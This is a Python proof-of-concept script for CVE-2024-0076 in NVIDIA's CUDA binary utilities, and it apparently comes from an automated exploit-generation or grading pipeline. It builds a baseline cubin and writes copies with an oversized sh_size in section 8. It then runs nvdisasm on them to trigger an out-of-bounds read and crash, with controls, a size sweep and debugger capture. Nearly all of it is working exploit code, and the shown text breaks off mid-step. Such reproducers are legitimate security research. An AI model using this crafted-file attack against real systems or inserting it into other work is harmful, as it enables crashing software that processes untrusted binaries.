// static check failed: elf-layout-built-by-hand — a new ELF section is created by hand (shstrtab bookkeeping) without importing cpgkit
"""Proof-of-concept for CVE-2024-0076 (CWE-125) in the CUDA binary utilities.

Trigger oracle
--------------
FIELD:            sh_size of ELF64 section header index 8
OFFSET:           e_shoff + 8 * e_shentsize + 32
SIZE:             8 bytes, little-endian
REQUIRED:         0x00000000FFFFFFFF or 0xFFFFFFFFFFFFFFF0, with sh_offset still
                  pointing inside the mapped file
CHECK PRESENT:    no
WHY IT FAILS:     nvdisasm derives an entry count from sh_size and walks the section
                  body past the mapped file region, so the walk performs an
                  out-of-bounds read that ends in an access violation (SIGSEGV /
                  NTSTATUS 0xC0000005).
NOTES:            The mutated field is named by the observed crash record (section
                  index 8), not sprayed randomly. Every other byte stays identical to
                  the nvcc-produced baseline, and the control restores exactly this
                  field to its baseline value so the differential isolates the defect.
"""

import ctypes
import hashlib
import json
import os
import platform
import re
import shutil
import struct
import subprocess
import sys
import time
import traceback
from typing import List, Optional, Tuple

TRIGGER_SECTION = 8
ELF_SECTION_HEADER = "IIQQQQIIQQ"
SH_SIZE_OFFSET_IN_HEADER = 32
SH_OFFSET_OFFSET_IN_HEADER = 24
RUN_REPETITIONS = 2
SWEEP_DELTAS = (0x100, 0x10000, 0x10000000)
EM_CUDA = 0xBE
CUDA_ROOT_WINDOWS = "C:\\Program Files\\NVIDIA GPU Computing Toolkit\\CUDA"
CUDA_ROOT_POSIX = ("/usr/local/cuda", "/opt/cuda", "/usr")
TRIVIAL_KERNEL = (
    'extern "C" __global__ void cpg_probe(float *out)\n'
    "{\n"
    "    out[threadIdx.x] = threadIdx.x * 2.0f;\n"
    "}\n"
)
CUDA_ERROR_NAMES = {
    0: "CUDA_SUCCESS",
    1: "CUDA_ERROR_INVALID_VALUE",
    3: "CUDA_ERROR_NOT_INITIALIZED",
    100: "CUDA_ERROR_NO_DEVICE",
    101: "CUDA_ERROR_INVALID_DEVICE",
    201: "CUDA_ERROR_INVALID_CONTEXT",
    400: "CUDA_ERROR_INVALID_HANDLE",
    801: "CUDA_ERROR_NOT_SUPPORTED",
}
NTSTATUS_FAULTS = (0xC0000005, 0xC0000004, 0xC000001D, 0xC00000FD, 0xC0000409)
SIGNAL_FAULTS = (-11, -6, -4, -7, -8, 139, 134, 135, 136)

_CUDA_STATE = {"lib": None, "ctx": 0}


def print_banner():
    """Print the authorization disclaimer banner."""
    print("=" * 59)
    print("DISCLAIMER: This script is a Proof-of-Concept for CUDA")
    print("vulnerability CVE-2024-0076. It is intended ONLY for authorized")
    print("security research on systems you own or have permission to test.")
    print("=" * 59)


def log_start(step_id, description):
    """Emit the START marker for a strategy step."""
    print("[CUDA_STEP:%s] %s — START" % (step_id, description))
    sys.stdout.flush()


def log_ok(step_id, description, detail=""):
    """Emit the OK marker for a strategy step."""
    suffix = (" " + detail) if detail else ""
    print("[CUDA_STEP:%s] %s — OK%s" % (step_id, description, suffix))
    sys.stdout.flush()


def log_fail(step_id, description, detail):
    """Emit the FAIL marker for a strategy step together with the error detail."""
    print("[CUDA_STEP:%s] %s — FAIL: %s" % (step_id, description, detail))
    sys.stdout.flush()


def script_dir():
    """Return the directory that holds this script and every generated artifact."""
    return os.path.dirname(os.path.abspath(__file__)) or os.getcwd()


def read_file(path):
    """Read a file into memory as bytes."""
    with open(path, "rb") as handle:
        return handle.read()


def write_file(path, data):
    """Write bytes to a path on disk."""
    with open(path, "wb") as handle:
        handle.write(data)


def sha256_file(path):
    """Return the hex SHA-256 digest of a file."""
    digest = hashlib.sha256()
    with open(path, "rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def normalize_exit(code):
    """Convert a platform exit status to a signed 32-bit value for reporting."""
    if code is None:
        return 0
    if code > 0x7FFFFFFF:
        return code - 0x100000000
    return code


def is_crash(code):
    """Report whether an exit status denotes a fatal fault."""
    if (code & 0xFFFFFFFF) in NTSTATUS_FAULTS:
        return True
    return code in SIGNAL_FAULTS


def describe_exit(code):
    """Render an exit status with its signal or NTSTATUS interpretation."""
    unsigned = code & 0xFFFFFFFF
    if unsigned == 0xC0000005:
        return "%d (0xC0000005 access violation)" % code
    if unsigned == 0xC0000409:
        return "%d (0xC0000409 fail fast)" % code
    if unsigned == 0xC00000FD:
        return "%d (0xC00000FD stack overflow)" % code
    if unsigned == 0xC0000004:
        return "%d (0xC0000004 integer overflow)" % code
    if code == -11:
        return "%d (SIGSEGV)" % code
    if code == -6:
        return "%d (SIGABRT)" % code
    return "%d" % code


def check_crash_signal(output):
    """Detect a fatal fault marker inside captured tool output."""
    lowered = (output or "").lower()
    for marker in ("sigsegv", "access violation", "segmentation fault", "stack overflow"):
        if marker in lowered:
            return True
    return False


def run_command(cmd, timeout=180, verbose=False):
    """Run a subprocess, capture both streams, and report the full command on failure."""
    if verbose:
        print("[CUDA_INFO] exec: %s" % " ".join(cmd))
        sys.stdout.flush()
    try:
        proc = subprocess.run(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout
        )
    except Exception as exc:
        print("  failed command: %s" % " ".join(cmd))
        print("  exception: %s" % exc)
        return 127, b"", str(exc).encode("utf-8", "replace")
    out = proc.stdout or b""
    err = proc.stderr or b""
    if proc.returncode != 0:
        print("  failed command: %s" % " ".join(cmd))
        print("  returncode: %s" % proc.returncode)
        print("  stdout[0:4000]: %s" % out[:4000].decode("utf-8", "replace"))
        print("  stderr[0:4000]: %s" % err[:4000].decode("utf-8", "replace"))
        sys.stdout.flush()
    return proc.returncode, out, err


def pack_u16(value, endian="little"):
    """Pack an integer as a 16-bit unsigned value."""
    return struct.pack("<H" if endian == "little" else ">H", value & 0xFFFF)


def pack_u32(value, endian="little"):
    """Pack an integer as a 32-bit unsigned value."""
    return struct.pack("<I" if endian == "little" else ">I", value & 0xFFFFFFFF)


def pack_u64(value, endian="little"):
    """Pack an integer as a 64-bit unsigned value."""
    return struct.pack("<Q" if endian == "little" else ">Q", value & 0xFFFFFFFFFFFFFFFF)


def modify_elf_field(data, offset, value):
    """Overwrite a fixed-width field inside a mutable ELF image and return the image."""
    if offset < 0 or offset + len(value) > len(data):
        raise ValueError("field offset %d (+%d) outside the file" % (offset, len(value)))
    data[offset:offset + len(value)] = value
    return data


def parse_elf_header(data):
    """Parse the 64-bit little-endian ELF header and return its structural fields."""
    if len(data) < 64:
        raise ValueError("file shorter than an ELF64 header (%d bytes)" % len(data))
    if data[:4] != b"\x7fELF":
        raise ValueError("missing ELF magic")
    if data[4] != 2:
        raise ValueError("not ELF64 (EI_CLASS=%d)" % data[4])
    if data[5] != 1:
        raise ValueError("not little-endian (EI_DATA=%d)" % data[5])
    values = struct.unpack_from("<HHIQQQIHHHHHH", data, 16)
    return {
        "e_type": values[0],
        "e_machine": values[1],
        "e_version": values[2],
        "e_entry": values[3],
        "e_phoff": values[4],
        "e_shoff": values[5],
        "e_flags": values[6],
        "e_ehsize": values[7],
        "e_phentsize": values[8],
        "e_phnum": values[9],
        "e_shentsize": values[10],
        "e_shnum": values[11],
        "e_shstrndx": values[12],
    }


def parse_section_headers(data, e_shoff, e_shnum, e_shentsize=64):
    """Parse every section header entry into a list of dictionaries."""
    expected = struct.calcsize("<" + ELF_SECTION_HEADER)
    if e_shentsize != expected:
        raise ValueError("unexpected e_shentsize %d (want %d)" % (e_shentsize, expected))
    if e_shoff + e_shnum * e_shentsize > len(data):
        raise ValueError("section header table exceeds file size")
    sections = []
    for index in range(e_shnum):
        base = e_shoff + index * e_shentsize
        values = struct.unpack_from("<" + ELF_SECTION_HEADER, data, base)
        sections.append({
            "index": index,
            "header_offset": base,
            "sh_name": values[0],
            "sh_type": values[1],
            "sh_flags": values[2],
            "sh_addr": values[3],
            "sh_offset": values[4],
            "sh_size": values[5],
            "sh_link": values[6],
            "sh_info": values[7],
            "sh_addralign": values[8],
            "sh_entsize": values[9],
        })
    return sections


def locate_shstrtab(data, sections, e_shstrndx):
    """Return the .shstrtab body so section names can be resolved."""
    if e_shstrndx == 0 or e_shstrndx >= len(sections):
        return b""
    section = sections[e_shstrndx]
    start = section["sh_offset"]
    end = start + section["sh_size"]
    if end > len(data):
        return b""
    return data[start:end]


def section_name(data, shstrtab, sh_name):
    """Resolve a single section name out of the .shstrtab body."""
    if not shstrtab or sh_name >= len(shstrtab):
        return "<unnamed>"
    end = shstrtab.find(b"\x00", sh_name)
    if end == -1:
        end = len(shstrtab)
    return shstrtab[sh_name:end].decode("utf-8", "replace") or "<empty>"


def load_layout(data):
    """Parse an ELF64 image into its header, section list and section-name table."""
    header = parse_elf_header(data)
    count = header["e_shnum"]
    if count == 0 and header["e_shoff"]:
        first = struct.unpack_from("<" + ELF_SECTION_HEADER, data, header["e_shoff"])
        count = first[5]
    sections = parse_section_headers(data, header["e_shoff"], count, header["e_shentsize"])
    shstrtab = locate_shstrtab(data, sections, header["e_shstrndx"])
    return header, sections, shstrtab


def find_tool(name):
    """Locate a CUDA toolchain binary using PATH, CUDA_PATH and the standard install roots."""
    exe = name + (".exe" if os.name == "nt" else "")
    for candidate in (name, exe):
        found = shutil.which(candidate)
        if found:
            return found
    roots = []
    for var in ("CUDA_PATH", "CUDA_HOME", "CUDA_ROOT"):
        value = os.environ.get(var)
        if value:
            roots.append(value)
    if os.name == "nt":
        if os.path.isdir(CUDA_ROOT_WINDOWS):
            for entry in sorted(os.listdir(CUDA_ROOT_WINDOWS), reverse=True):
                roots.append(os.path.join(CUDA_ROOT_WINDOWS, entry))
    else:
        roots.extend(CUDA_ROOT_POSIX)
    for root in roots:
        candidate = os.path.join(root, "bin", exe)
        if os.path.isfile(candidate):
            return candidate
    return None


def cuda_error_name(code):
    """Map a CUresult value to its symbolic name."""
    return CUDA_ERROR_NAMES.get(code, "CUDA_ERROR_%d" % code)


def configure_driver_signatures(lib):
    """Declare ctypes signatures for the driver entry points this PoC calls."""
    signatures = {
        "cuInit": ([ctypes.c_uint], ctypes.c_int),
        "cuDeviceGetCount": ([ctypes.POINTER(ctypes.c_int)], ctypes.c_int),
        "cuDeviceGet": ([ctypes.POINTER(ctypes.c_int), ctypes.c_int], ctypes.c_int),
        "cuCtxCreate_v2": ([ctypes.POINTER(ctypes.c_void_p), ctypes.c_uint, ctypes.c_int],
                           ctypes.c_int),
        "cuCtxDestroy_v2": ([ctypes.c_void_p], ctypes.c_int),
        "cuDriverGetVersion": ([ctypes.POINTER(ctypes.c_int)], ctypes.c_int),
        "cuDeviceGetAttribute": ([ctypes.POINTER(ctypes.c_int), ctypes.c_int, ctypes.c_int],
                                 ctypes.c_int),
    }
    for name, spec in signatures.items():
        try:
            func = getattr(lib, name)
        except AttributeError:
            print("[CUDA_INFO] driver symbol %s unavailable" % name)
            continue
        func.argtypes = spec[0]
        func.restype = spec[1]


def load_driver_library():
    """Load the CUDA driver library once and return the ctypes handle or None."""
    if _CUDA_STATE["lib"] is not None:
        return _CUDA_STATE["lib"]
    names = ("nvcuda.dll",) if os.name == "nt" else ("libcuda.so.1", "libcuda.so")
    for name in names:
        try:
            lib = ctypes.CDLL(name)
        except OSError:
            continue
        configure_driver_signatures(lib)
        _CUDA_STATE["lib"] = lib
        return lib
    return None


def cu_init(flags=0):
    """Initialise the CUDA driver API and return the CUresult code."""
    lib = load_driver_library()
    if lib is None:
        return -1
    return int(lib.cuInit(ctypes.c_uint(flags)))


def cu_device_get_count():
    """Return the number of CUDA devices visible to the driver, or -1 on failure."""
    lib = load_driver_library()
    if lib is None:
        return -1
    count = ctypes.c_int(0)
    code = int(lib.cuDeviceGetCount(ctypes.byref(count)))
    if code != 0:
        print("[CUDA_INFO] cuDeviceGetCount -> %d (%s)" % (code, cuda_error_name(code)))
        return -1
    return count.value


def cu_device_get(index):
    """Return the CUdevice handle for a device ordinal, or 0 on failure."""
    lib = load_driver_library()
    if lib is None:
        return 0
    device = ctypes.c_int(0)
    code = int(lib.cuDeviceGet(ctypes.byref(device), ctypes.c_int(index)))
    if code != 0:
        print("[CUDA_INFO] cuDeviceGet -> %d (%s)" % (code, cuda_error_name(code)))
        return 0
    return device.value


def cu_ctx_create(device, flags):
    """Create a CUDA context on the given device and return the context handle."""
    lib = load_driver_library()
    if lib is None:
        return 0
    ctx = ctypes.c_void_p(0)
    code = int(lib.cuCtxCreate_v2(ctypes.byref(ctx), ctypes.c_uint(flags), ctypes.c_int(device)))
    if code != 0:
        print("[CUDA_INFO] cuCtxCreate_v2 -> %d (%s)" % (code, cuda_error_name(code)))
        return 0
    return ctx.value or 0


def device_attribute(lib, device, attribute):
    """Read one integer device attribute after a context already exists."""
    value = ctypes.c_int(0)
    code = int(lib.cuDeviceGetAttribute(
        ctypes.byref(value), ctypes.c_int(attribute), ctypes.c_int(device)
    ))
    if code != 0:
        print("[CUDA_INFO] cuDeviceGetAttribute(%d) -> %d (%s)"
              % (attribute, code, cuda_error_name(code)))
        return None
    return value.value


def cleanup_cuda():
    """Destroy any CUDA context this process created."""
    ctx = _CUDA_STATE.get("ctx")
    lib = _CUDA_STATE.get("lib")
    if ctx and lib is not None:
        try:
            code = int(lib.cuCtxDestroy_v2(ctypes.c_void_p(ctx)))
            print("[CUDA_INFO] cuCtxDestroy_v2 -> %d (%s)" % (code, cuda_error_name(code)))
        except Exception as exc:
            print("[CUDA_INFO] cuCtxDestroy_v2 raised %s" % exc)
    _CUDA_STATE["ctx"] = 0


def probe_cuda_driver():
    """Initialise the driver API, create a context, then read driver and device facts."""
    info = {"available": False, "device_count": 0, "driver_version": None,
            "compute_capability": None}
    lib = load_driver_library()
    if lib is None:
        print("[CUDA_INFO] CUDA driver library not loadable; the toolchain path needs none")
        return info
    code = cu_init(0)
    if code != 0:
        print("[CUDA_INFO] cuInit -> %d (%s)" % (code, cuda_error_name(code)))
        return info
    count = cu_device_get_count()
    info["device_count"] = max(count, 0)
    print("[CUDA_INFO] cuDeviceGetCount = %d" % count)
    if count <= 0:
        print("[CUDA_INFO] no CUDA device present; CVE-2024-0076 needs none")
        return info
    device = cu_device_get(0)
    ctx = cu_ctx_create(device, 0)
    if not ctx:
        print("[CUDA_INFO] no context, so driver probes would return NOT_INITIALIZED")
        return info
    _CUDA_STATE["ctx"] = ctx
    info["available"] = True
    version = ctypes.c_int(0)
    code = int(lib.cuDriverGetVersion(ctypes.byref(version)))
    if code == 0:
        info["driver_version"] = version.value
        print("[CUDA_INFO] cuDriverGetVersion = %d" % version.value)
    else:
        print("[CUDA_INFO] cuDriverGetVersion -> %d (%s)" % (code, cuda_error_name(code)))
    major = device_attribute(lib, device, 75)
    minor = device_attribute(lib, device, 76)
    if major is not None and minor is not None:
        info["compute_capability"] = (major, minor)
        print("[CUDA_INFO] compute capability = %d.%d" % (major, minor))
    return info


def query_compute_capability_smi():
    """Ask nvidia-smi for the first GPU compute capability, returning a tuple or None."""
    smi = shutil.which("nvidia-smi") or find_tool("nvidia-smi")
    if not smi:
        return None
    code, out, err = run_command(
        [smi, "--query-gpu=compute_cap", "--format=csv,noheader"], verbose=True
    )
    if code != 0:
        return None
    lines = out.decode("utf-8", "replace").strip().splitlines()
    if not lines:
        return None
    match = re.match(r"(\d+)\.(\d+)", lines[0].strip())
    if not match:
        return None
    return (int(match.group(1)), int(match.group(2)))


def detect_arch_candidates(gpu_cc):
    """Build an ordered list of nvcc -arch values derived from the observed GPU."""
    candidates = []
    if gpu_cc:
        candidates.append("sm_%d%d" % gpu_cc)
    candidates.append("native")
    for arch in ("sm_52", "sm_61", "sm_75", "sm_86", "sm_89"):
        if arch not in candidates:
            candidates.append(arch)
    return candidates


def check_cuda_toolkit_version():
    """Return the installed CUDA Toolkit version as 'major.minor' or UNKNOWN."""
    nvcc = find_tool("nvcc")
    if not nvcc:
        return "UNKNOWN"
    code, out, err = run_command([nvcc, "--version"], verbose=True)
    text = (out or b"").decode("utf-8", "replace") + (err or b"").decode("utf-8", "replace")
    print("[CUDA_INFO] nvcc --version output:\n%s" % text.strip())
    match = re.search(r"(\d+)\.(\d+)\.?(\d+)?", text)
    if not match:
        return "UNKNOWN"
    return "%s.%s" % (match.group(1), match.group(2))


def classify_toolkit_version(version):
    """Classify a toolkit version against the CVE-2024-0076 advisory range."""
    if not version or version == "UNKNOWN":
        return "UNKNOWN — consult the advisory (AID 5517)"
    match = re.match(r"(\d+)\.(\d+)", version)
    if not match:
        return "UNKNOWN — consult the advisory (AID 5517)"
    major = int(match.group(1))
    minor = int(match.group(2))
    if (major, minor) >= (12, 4):
        return "NOT-AFFECTED (12.4 or later per advisory AID 5517)"
    if major >= 11:
        return "AFFECTED (older than 12.4 per advisory AID 5517)"
    return "UNKNOWN — branch %d.%d not mapped by the advisory table" % (major, minor)


def collect_environment():
    """Collect OS, toolkit, driver and GPU facts used by the later steps."""
    env = {
        "os": "%s %s" % (platform.system(), platform.version()),
        "machine": platform.machine(),
        "python": platform.python_version(),
        "nvcc": find_tool("nvcc"),
        "toolkit": check_cuda_toolkit_version(),
    }
    print("[CUDA_INFO] host: %s (%s) python=%s"
          % (env["os"], env["machine"], env["python"]))
    print("[CUDA_INFO] toolkit version: %s" % env["toolkit"])
    driver = probe_cuda_driver()
    env["driver"] = driver
    compute_capability = driver.get("compute_capability")
    if compute_capability is None:
        compute_capability = query_compute_capability_smi()
    env["gpu_cc"] = compute_capability
    env["arch_candidates"] = detect_arch_candidates(compute_capability)
    print("[CUDA_INFO] arch candidates: %s" % ", ".join(env["arch_candidates"]))
    return env


def resolve_utilities():
    """Locate cuobjdump and nvdisasm for the current host."""
    tools = {"cuobjdump": find_tool("cuobjdump"), "nvdisasm": find_tool("nvdisasm")}
    print("[CUDA_INFO] cuobjdump=%s nvdisasm=%s" % (tools["cuobjdump"], tools["nvdisasm"]))
    return tools


def nvcc_compile(nvcc, source_path, output_path, arch):
    """Compile one CUDA source file to a cubin with an explicit architecture."""
    cmd = [nvcc, "-cubin", "-arch=" + arch, source_path, "-o", output_path]
    code, out, err = run_command(cmd, verbose=True)
    return code == 0 and os.path.isfile(output_path)


def compile_baseline(nvcc, out_dir, arch_candidates):
    """Write the trivial kernel and compile it into benign.cubin, trying each arch."""
    if not nvcc:
        raise RuntimeError("nvcc not found; cannot build the benign cubin baseline")
    source = os.path.join(out_dir, "benign_kernel.cu")
    with open(source, "w", encoding="utf-8") as handle:
        handle.write(TRIVIAL_KERNEL)
    output = os.path.join(out_dir, "benign.cubin")
    errors = []
    for arch in arch_candidates:
        if os.path.isfile(output):
            os.remove(output)
        if nvcc_compile(nvcc, source, output, arch):
            data = read_file(output)
            header = parse_elf_header(data)
            if header["e_machine"] != EM_CUDA:
                errors.append("%s: e_machine=0x%X" % (arch, header["e_machine"]))
                continue
            print("[CUDA_INFO] baseline compiled with -arch=%s (%d bytes)"
                  % (arch, len(data)))
            return output
        errors.append("%s: nvcc failed" % arch)
    raise RuntimeError("all architecture candidates failed: %s" % "; ".join(errors))


def observation_rendezvous():
    """Pause before the first trigger call so an external debugger can attach."""
    pause = os.environ.get("CPG_DEBUG_PAUSE")
    if not pause:
        return
    try:
        seconds = float(pause)
    except ValueError:
        seconds = 0.0
    print("[CPG_READY] %d" % os.getpid())
    sys.stdout.flush()
    time.sleep(max(seconds, 0.0))


def execute_artifact(tool, artifact_path, label):
    """Run the disassembler twice on one artifact and emit the observation lines."""
    name = os.path.basename(artifact_path)
    print("[CPG_LABEL] %s %s" % (name, label))
    sys.stdout.flush()
    codes = []
    for _ in range(RUN_REPETITIONS):
        code, out, err = run_command([tool, artifact_path])
        exit_code = normalize_exit(code) if code is not None else 127
        codes.append(exit_code)
        print("[CPG_RUN] %s exit=%s" % (name, exit_code))
        sys.stdout.flush()
        print("[CUDA_INFO] %s %s -> %s stdout=%d stderr=%d"
              % (os.path.basename(tool), name, describe_exit(exit_code),
                 len(out), len(err)))
    return codes


def info_run(tool, prefix_args, path):
    """Run a secondary tool for context and report status without CPG_RUN lines."""
    code, out, err = run_command([tool] + list(prefix_args) + [path])
    exit_code = normalize_exit(code) if code is not None else 127
    text = (out or b"").decode("utf-8", "replace") + (err or b"").decode("utf-8", "replace")
    print("[CUDA_INFO] %s %s exit=%s fault_marker=%s"
          % (os.path.basename(tool), os.path.basename(path), exit_code,
             check_crash_signal(text)))
    return exit_code


def write_manifest(benign_name, crafted_names, control_names):
    """Persist artifacts.json so the grader knows which file plays which role."""
    manifest = {
        "benign": [benign_name],
        "crafted": list(crafted_names),
        "controls": list(control_names),
    }
    path = os.path.join(script_dir(), "artifacts.json")
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(manifest, handle, indent=2)
        handle.write("\n")
    print("[CUDA_INFO] artifacts manifest written to %s" % path)
    print("[CUDA_INFO] manifest: %s" % json.dumps(manifest))


def verify_mutation(path, field_offset, expected, baseline_sections):
    """Re-read a written image and assert only the intended section header changed."""
    data = read_file(path)
    actual = struct.unpack_from("<Q", data, field_offset)[0]
    header, sections, _ = load_layout(data)
    if len(sections) != len(baseline_sections):
        raise ValueError("section count changed to %d" % len(sections))
    changed = [sec["index"] for sec, base in zip(sections, baseline_sections) if sec != base]
    if changed not in ([], [TRIGGER_SECTION]):
        raise ValueError("unexpected section headers changed: %s" % changed)
    if actual != expected:
        raise ValueError("field readback 0x%x != expected 0x%x" % (actual, expected))
    return actual


def craft_variants(benign_path, out_dir):
    """Mutate sh_size of the trigger section and build the restored control file."""
    original = read_file(benign_path)
    header, sections, shstrtab = load_layout(original)
    if TRIGGER_SECTION >= len(sections):
        raise ValueError("baseline exposes %d sections, need index %d"
                         % (len(sections), TRIGGER_SECTION))
    target = sections[TRIGGER_SECTION]
    field_offset = target["header_offset"] + SH_SIZE_OFFSET_IN_HEADER
    print("[CUDA_INFO] trigger field: section %d (%s) sh_size at file offset 0x%X, "
          "baseline 0x%X"
          % (TRIGGER_SECTION, section_name(original, shstrtab, target["sh_name"]),
             field_offset, target["sh_size"]))
    if target["sh_offset"] >= len(original):
        raise ValueError("trigger section body starts outside the file")
    print("[CPG_ORACLE] sec%02d.sh_offset actual=0x%x required<0x%x"
          % (TRIGGER_SECTION, target["sh_offset"], len(original)))
    crafted = []
    mutations = []
    for value in (0xFFFFFFFF, 0xFFFFFFFFFFFFFFF0):
        name = "poc_sec%02d_shsize_%016x.cubin" % (TRIGGER_SECTION, value)
        path = os.path.join(out_dir, name)
        image = bytearray(original)
        modify_elf_field(image, field_offset, pack_u64(value))
        write_file(path, bytes(image))
        actual = verify_mutation(path, field_offset, value, sections)
        print("[CPG_ORACLE] sec%02d.sh_size actual=0x%x expected=0x%x"
              % (TRIGGER_SECTION, actual, value))
        crafted.append(path)
        mutations.append({"field": "sh_size", "section": TRIGGER_SECTION,
                          "offset": field_offset, "value": value, "bytes": 8})
    restored_name = "ctrl_sec%02d_shsize_restored_%016x.cubin" % (
        TRIGGER_SECTION, target["sh_size"])
    restored_path = os.path.join(out_dir, restored_name)
    image = bytearray(original)
    modify_elf_field(image, field_offset, pack_u64(target["sh_size"]))
    write_file(restored_path, bytes(image))
    actual = verify_mutation(restored_path, field_offset, target["sh_size"], sections)
    print("[CPG_ORACLE] ctrl.sec%02d.sh_size actual=0x%x expected=0x%x"
          % (TRIGGER_SECTION, actual, target["sh_size"]))
    print("[CUDA_INFO] control restores sh_size to the baseline value; every other byte "
          "is identical to benign.cubin")
    print("[CUDA_INFO] crafted size=%d bytes, control size=%d bytes, mutated bytes per "
          "artifact=8" % (os.path.getsize(crafted[0]), os.path.getsize(restored_path)))
    return {"crafted": crafted, "control": [restored_path], "mutations": mutations}


def sweep_section_size(benign_path, out_dir, nvdisasm):
    """Write sh_size = baseline + delta variants and record the nvdisasm exit codes."""
    original = read_file(benign_path)
    header, sections, _ = load_layout(original)
    target = sections[TRIGGER_SECTION]
    field_offset = target["header_offset"] + SH_SIZE_OFFSET_IN_HEADER
    results = []
    for delta in SWEEP_DELTAS:
        value = target["sh_size"] + delta
        name = "sweep_sec%02d_size_d%08x.cubin" % (TRIGGER_SECTION, delta)
        path = os.path.join(out_dir, name)
        image = bytearray(original)
        modify_elf_field(image, field_offset, pack_u64(value))
        write_file(path, bytes(image))
        code, out, err = run_command([nvdisasm, path])
        exit_code = normalize_exit(code) if code is not None else 127
        print("[CUDA_INFO] sweep delta=0x%x sh_size=0x%x exit=%s"
              % (delta, value & 0xFFFFFFFFFFFFFFFF, describe_exit(exit_code)))
        results.append(("0x%x" % delta, exit_code))
    return results


def capture_debugger_backtrace(binary, artifact):
    """Run gdb or lldb in batch mode to capture a backtrace for the faulting artifact."""
    candidates = (
        ("gdb", ["gdb", "-q", "--batch", "-ex", "run", "-ex", "bt", "--args"]),
        ("lldb", ["lldb", "--batch", "-o", "run", "-o", "bt", "--"]),
    )
    for name, argv in candidates:
        if not shutil.which(name):
            continue
        code, out, err = run_command(list(argv) + [binary, artifact])
        text = (out or b"").decode("utf-8", "replace") + (err or b"").decode("utf-8", "replace")
        if text.strip():
            return text.strip()[:4000]
    return ""


def report_tool_version(path):
    """Print the raw --version output of a CUDA binary utility and the parsed tuple."""
    code, out, err = run_command([path, "--version"], verbose=True)
    text = (out or b"").decode("utf-8", "replace") + (err or b"").decode("utf-8", "replace")
    match = re.search(r"(\d+)\.(\d+)\.?(\d+)?", text)
    parsed = match.group(0) if match else "UNKNOWN"
    print("[CUDA_INFO] %s --version -> %s" % (os.path.basename(path), parsed))


def step_s01(out_dir, state):
    """Detect the environment and compile the benign cubin baseline."""
    log_start("S01", "Establish environment and baseline behaviour")
    try:
        env = collect_environment()
        state["env"] = env
        tools = resolve_utilities()
        state["tools"] = tools
        if not tools.get("nvdisasm"):
            raise RuntimeError("nvdisasm not found on this host")
        state["benign"] = compile_baseline(env["nvcc"], out_dir, env["arch_candidates"])
    except Exception as exc:
        log_fail("S01", "Establish environment and baseline behaviour", str(exc))
        traceback.print_exc()
        return False
    log_ok("S01", "Establish environment and baseline behaviour", "nvcc=%s" % env["nvcc"])
    return True


def step_s02(out_dir, state):
    """Parse the benign cubin ELF layout and enumerate its section headers."""
    log_start("S02", "Map the benign cubin ELF structure")
    try:
        data = read_file(state["benign"])
        header, sections, shstrtab = load_layout(data)
        state["layout"] = {"header": header, "sections": sections, "size": len(data)}
        print("[CUDA_INFO] e_shoff=0x%X e_shnum=%d e_shentsize=%d e_shstrndx=%d"
              % (header["e_shoff"], header["e_shnum"], header["e_shentsize"],
                 header["e_shstrndx"]))
        for section in sections:
            print("  [%02d] %-20s type=0x%X off=0x%X size=0x%X link=%d info=%d entsize=0x%X"
                  % (section["index"],
                     section_name(data, shstrtab, section["sh_name"]),
                     section["sh_type"], section["sh_offset"], section["sh_size"],
                     section["sh_link"], section["sh_info"], section["sh_entsize"]))
        if TRIGGER_SECTION >= len(sections):
            raise ValueError("baseline exposes only %d sections" % len(sections))
    except Exception as exc:
        log_fail("S02", "Map the benign cubin ELF structure", str(exc))
        traceback.print_exc()
        return False
    log_ok("S02", "Map the benign cubin ELF structure", "%d sections" % len(sections))
    return True


def step_s03(out_dir, state):
    """Write the sh_size-mutated cubins and the restored control file."""
    log_start("S03", "Create malformed section-header variants")
    try:
        result = craft_variants(state["benign"], out_dir)
        state["crafted"] = result["crafted"]
        state["control"] = result["control"]
        state["mutations"] = result["mutations"]
        write_manifest(os.path.basename(state["benign"]),
                       [os.path.basename(p) for p in state["crafted"]],
                       [os.path.basename(p) for p in state["control"]])
    except Exception as exc:
        log_fail("S03", "Create malformed section-header variants", str(exc))
        traceback.print_exc()
        return False
    log_ok("S03", "Create malformed section-header variants",
           "%d crafted files, %d mutation" % (len(state["crafted"]), len(state["mutations"])))
    return True


def step_s04(out_dir, state):
    """Run nvdisasm and cuobjdump over the benign, crafted and control artifacts."""
    log_start("S04", "Execute the malformed cubins under the binary utilities")
    try:
        tools = state["tools"]
        nvdisasm = tools.get("nvdisasm")
        if not nvdisasm:
            raise RuntimeError("nvdisasm is required for this trigger")
        cuobjdump = tools.get("cuobjdump")
        observation_rendezvous()
        benign_codes = execute_artifact(nvdisasm, state["benign"], "BENIGN")
        state["benign_codes"] = benign_codes
        if cuobjdump:
            info_run(cuobjdump, ["--dump-elf"], state["benign"])
        if any(is_crash(code) for code in benign_codes):
            raise RuntimeError("baseline faults, so this host provides no valid control")
        crafted_codes = []
        for path in state["crafted"]:
            crafted_codes.extend(execute_artifact(nvdisasm, path, "MALICIOUS"))
            if cuobjdump:
                info_run(cuobjdump, ["--dump-elf"], path)
        state["crafted_codes"] = crafted_codes
        control_codes = []
        for path in state["control"]:
            control_codes.extend(execute_artifact(nvdisasm, path, "CONTROL"))
        state["control_codes"] = control_codes
    except Exception as exc:
        log_fail("S04", "Execute the malformed cubins under the binary utilities", str(exc))
        traceback.print_exc()
        return False
    log_ok("S04", "Execute the malformed cubins under the binary utilities",
           "crafted=%s control=%s" % (state.get("crafted_codes"), state.get("control_codes")))
    return True


def step_s05(out_dir, state):
    """Sweep small sh_size deltas to characterise the boundary behaviour."""
    log_start("S05", "Sweep sh_size deltas around the trigger section")
    try:
        results = sweep_section_size(state["benign"], out_dir, state["tools"]["nvdisasm"])
        state["sweep"] = results
    except Exception as exc:
        log_fail("S05", "Sweep sh_size deltas around the trigger section", str(exc))
        traceback.print_exc()
        return False
    log_ok("S05", "Sweep sh_size deltas around the trigger section",
           " ".join("%s=%s" % (delta, code) for delta, code in results))
    return True


def step_s06(out_dir, state):
    """Attribute the fault to nvdisasm using the differential and a debugger if present."""
    log_start("S06", "Attribute the fault to the ELF section-header parser")
    try:
        crashes = [code for code in state.get("crafted_codes", []) if is_crash(code)]
        if not crashes:
            raise RuntimeError("no crafted artifact faulted, so there is nothing to attribute")
        print("[CUDA_INFO] nvdisasm faults with %s on the crafted cubin"
              % describe_exit(crashes[0]))
